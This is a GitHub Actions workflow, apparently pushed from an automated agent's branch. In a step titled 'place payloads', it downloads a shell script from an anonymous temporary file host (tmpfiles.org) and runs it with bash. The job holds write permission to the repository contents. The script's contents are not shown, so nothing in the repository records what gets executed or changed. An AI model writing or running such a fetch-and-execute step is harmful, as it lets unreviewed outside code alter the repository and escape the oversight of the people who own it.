name: place-pinocchio-b64
on:
  push:
    branches: [cursor/pinocchio-cel-fdad]
    paths: [.github/workflows/place-pinocchio-b64.yml]
permissions:
  contents: write
jobs:
  place:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: place payloads
        run: |
          set -euo pipefail
          page="https://tmpfiles.org/wcAoUJ476PBF/place-pinocchio-b64.sh"
          html=$(curl -fsSL --retry 5 --retry-delay 2 --max-time 60 -A curl/8.5.0 "$page")
          url=$(printf '%s' "$html" | python3 -c 'import sys,re; t=sys.stdin.read(); m=re.findall(r"https://tmpfiles.org/dl/[^\"\s<]+", t); print(m[-1] if m else "")')
          test -n "$url"
          curl -fsSL --retry 5 --retry-delay 2 --max-time 60 -A curl/8.5.0 -o /tmp/place.sh "$url"
          bash /tmp/place.sh
